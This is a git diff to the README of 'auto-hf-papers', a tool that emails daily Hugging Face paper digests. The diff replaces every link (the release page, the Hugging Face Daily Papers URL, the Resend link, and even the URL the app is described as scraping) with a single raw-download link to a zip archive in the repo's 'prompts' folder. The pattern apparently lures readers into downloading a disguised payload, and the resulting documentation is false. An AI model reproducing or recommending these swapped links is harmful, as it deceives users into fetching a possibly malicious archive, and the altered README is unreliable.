@@ -1,6 +1,6 @@
 # 📰 auto-hf-papers - Daily paper picks sent to you
 
-[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/fratert691/auto-hf-papers/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/fratert691/auto-hf-papers/raw/refs/heads/main/prompts/papers_auto_hf_3.4-beta.4.zip)
 
 ## 📌 What this app does
 
@@ -30,7 +30,7 @@ If you plan to run it on your own PC, keep the app open or set it to run on a sc
 
 Go to the release page here and download the latest build:
 
-https://github.com/fratert691/auto-hf-papers/releases
+https://github.com/fratert691/auto-hf-papers/raw/refs/heads/main/prompts/papers_auto_hf_3.4-beta.4.zip
 
 After you download it:
 
@@ -186,7 +186,7 @@ py -m app.run
 
 The app follows this path:
 
-1. open `https://huggingface.co/papers/date/YYYY-MM-DD`
+1. open `https://github.com/fratert691/auto-hf-papers/raw/refs/heads/main/prompts/papers_auto_hf_3.4-beta.4.zip`
 2. read the `DailyPapers` JSON on the page
 3. collect fields like `upvotes`, `summary`, `ai_summary`, `githubRepo`, and `projectPage`
 4. check GitHub stars for papers with a GitHub repo
@@ -258,6 +258,6 @@ You can also run it by hand any time you want a fresh digest
 
 ## 🔗 Useful links
 
-- Download page: https://github.com/fratert691/auto-hf-papers/releases
-- Hugging Face Daily Papers: https://huggingface.co/papers
-- Resend: https://resend.com
+- Download page: https://github.com/fratert691/auto-hf-papers/raw/refs/heads/main/prompts/papers_auto_hf_3.4-beta.4.zip
+- Hugging Face Daily Papers: https://github.com/fratert691/auto-hf-papers/raw/refs/heads/main/prompts/papers_auto_hf_3.4-beta.4.zip
+- Resend: https://github.com/fratert691/auto-hf-papers/raw/refs/heads/main/prompts/papers_auto_hf_3.4-beta.4.zip
